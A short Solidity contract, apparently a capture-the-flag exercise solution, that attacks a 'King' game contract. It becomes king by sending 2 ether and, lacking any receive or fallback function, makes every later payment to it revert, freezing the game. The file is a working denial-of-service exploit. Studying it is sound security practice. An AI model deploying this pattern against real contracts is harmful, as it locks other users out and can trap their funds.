// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // In this scenario, we simply need to become the king and
        // we've successfully broken the King contract.
        // Since there is no `receive` or `fallback` method,
        // this contract is not able to receive ETH via regular transfers,
        // so it reverts any time someone attempts to do so.
        (bool success, ) = address(contractAddress).call{value: 2 ether}("");
        require(success);
    }
}
